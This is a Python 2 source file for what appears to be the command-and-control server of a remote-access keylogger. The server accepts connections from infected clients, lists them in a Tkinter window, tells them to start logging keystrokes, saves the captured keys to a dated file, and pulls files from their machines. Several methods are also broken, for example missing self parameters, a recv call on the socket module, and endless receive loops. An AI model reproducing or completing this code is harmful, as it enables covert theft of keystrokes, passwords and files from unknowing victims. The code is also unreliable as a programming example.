from __future__ import print_function
import socket
import datetime
import threading
from Tkinter import END, NORMAL
import db
import Connection

class Server:

    def __init__(self, b):
        global box
        box = b
        return

    def getIP(f):
        s = socket.socket()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('google.com', 0))
        host = s.getsockname()[0]
        s.close()
        return host

    port = 44444
    box = None
    print(box)
    s = socket.socket()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((getIP("d"), port))
    s.listen(5)
    DB = db.DB()

    @staticmethod
    def newConn(nc):
        while (True):
            try:
                nc.socket.getpeername()
            except:
                ip = nc.ip
                hostname = nc.hostname
                Server.updateTextbox(str(ip) + "/" + hostname + " has disconnected...\n")
                return

    @staticmethod
    def trimMessage(m):
        newM = m.split('\x00')[0]
        return newM

    @staticmethod
    def waitForConns():
        Server.updateTextbox("Waiting for connections...\n")
        while (True):
            global s
            c, addr = Server.s.accept()
            hostname = Server.trimMessage(c.recv(256))
            nc = Connection.Connection(addr, hostname, c)
            Server.DB.insert(nc)
            t = threading.Thread(target=Server.newConn, args=[nc])
            t.setDaemon(True)
            t.start()

    @staticmethod
    def printClients():
        Server.updateTextbox("Here are the clients you have:")
        darr = Server.DB.getAllConnectionsPrint()
        for i in darr:
            Server.updateTextbox(str(i["hostname"] + ": " + str(i["ip"])))

    @staticmethod
    def updateTextbox(s):
        box.config(state=NORMAL)
        box.insert(END, s)

    def keyLog(conn):
        conn.socket.sendall("log")
        Server.recvKeyLogs(conn)


    def recvKeyLogs(conn):
        host = Server.DB.findBySock(conn.socket)
        date = str(datetime.date.today())
        f = open(date+'_keys.txt', 'w')
        while (True):
            key = socket.recv(512)
            f.write(key)
            print(key[0][0])


    def whatDo(cmd):
        conn = Server.DB.getConnectionHostIP(cmd[0].ip, cmd[0].hostname)
        if (cmd[1] == "log"):
            Server.keyLog(conn)
        elif ("list" in cmd[1]):
            Server.printClients()
        elif ("download" in cmd[1]):
            Server.downloadFile(conn)


    def downloadFile(socket):
        socket.send("send")
        f = open("test.jpg", "w")
        while (True):
            line = socket.recv(1024)
            print(line)
            f.write(line)


    def startServer(self):
        t = threading.Thread(target=Server.waitForConns)
        t.setDaemon(True)
        t.start()
